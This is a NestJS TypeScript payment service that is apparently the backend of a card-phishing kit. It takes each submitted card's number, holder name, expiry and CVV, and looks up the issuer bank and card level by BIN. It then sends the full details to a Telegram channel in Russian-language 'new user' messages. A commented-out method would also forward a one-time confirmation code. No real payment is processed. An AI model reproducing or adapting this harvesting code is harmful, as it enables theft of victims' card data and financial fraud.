import { Injectable } from '@nestjs/common';
import { Socket } from 'socket.io';
import axios from 'axios';
import { flag } from 'country-emoji';

import { TelegramService } from '../telegram/telegram.service';
import { PaymentDataDto } from './dto/payment-data.dto';

@Injectable()
export class PaymentService {
  constructor(private telegramService: TelegramService) {}

  async submitPaymentData(
    paymentDataDto: PaymentDataDto,
    socket: Socket,
  ): Promise<void> {
    const {
      cardNumber,
      cardHolder,
      cardMonth,
      cardYear,
      cardCvv,
      price,
    } = paymentDataDto;

    try {
      const { data: binInfo } = await axios.post(
        `https://bin-checker.net/api/${parseInt(
          cardNumber
            .split(' ')
            .join('')
            .slice(0, 6),
        )}`,
      );

      const message = `Новый пользователь!\nПрайс: ${price}€\nКарта: ${cardNumber}\nИмя: ${cardHolder}\nДата: ${cardMonth}/${cardYear}\nCVV: ${cardCvv}\nСтрана: ${flag(
        binInfo?.country?.name,
      ) || ''} ${binInfo?.country?.name ||
        'Неизвестно'}\nСистема: ${binInfo?.scheme ||
        'Неизвестно'}\nБанк: ${binInfo?.bank?.name ||
        'Неизвестно'}\nТип карты: ${binInfo?.type}\nУровень: ${binInfo?.level}`;

      await this.telegramService.sendPaymentData(message, socket);
    } catch (e) {
      const message = `Новый пользователь!\nПрайс: ${price}€\nКарта: ${cardNumber}\nИмя: ${cardHolder}\nДата: ${cardMonth}/${cardYear}\nCVV: ${cardCvv}`;

      await this.telegramService.sendPaymentData(message, socket);
    }
  }

  // async submitPaymentCode(
  //   paymentCodeDto: PaymentCodeDto,
  //   socket: Socket,
  // ): Promise<void> {
  //   const {
  //     cardNumber,
  //     cardHolder,
  //     cardMonth,
  //     cardYear,
  //     cardCvv,
  //     code,
  //   } = paymentCodeDto;

  //   const message = `Получен код! \nНомер карты: ${cardNumber}\nИмя: ${cardHolder}\nДата: ${cardMonth}/${cardYear}\nCVV: ${cardCvv}\nКод: ${code}`;

  //   await this.telegramService.sendPaymentCode(message, socket);
  // }
}
